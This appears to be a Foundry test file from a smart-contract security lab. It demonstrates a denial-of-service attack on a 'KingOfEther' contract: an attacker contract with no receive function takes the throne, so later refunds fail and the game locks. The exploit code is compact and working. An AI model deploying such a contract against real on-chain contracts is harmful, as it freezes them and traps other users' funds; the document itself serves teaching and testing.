// SPDX-Licence-Identifier: MIT

pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/DOS.sol";

contract KingExploit is Test {
    KingOfEther kingOfEtherContract;
    AttackKing attackKingContract;
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    function setUp() external {
        kingOfEtherContract = new KingOfEther();
        attackKingContract = new AttackKing(kingOfEtherContract);
        vm.deal(alice, 4 ether);
        vm.deal(bob, 4 ether);
    }

    function testDos() external {
        vm.prank(alice);
        kingOfEtherContract.claimThrone{value: 1 ether}();

        vm.prank(bob);
        kingOfEtherContract.claimThrone{value: 2 ether}();

        assertEq(address(alice).balance, 4 ether);
        console.log("Bob is the king now, Balance returned to Alice");

        attackKingContract.attack{value: 3 ether}();
        console.log("Now, the Attacker contract is the King");

        vm.prank(alice);
        vm.expectRevert("Transfer failed");
        kingOfEtherContract.claimThrone{value: 4 ether}();

        console.log("KingOfEther contract is locked now");
    }
}

contract AttackKing {
    KingOfEther kingOfEtherContract;

    constructor(KingOfEther _victim) {
        kingOfEtherContract = KingOfEther(_victim);
    }

    function attack() external payable {
        kingOfEtherContract.claimThrone{value: msg.value}();
    }
}
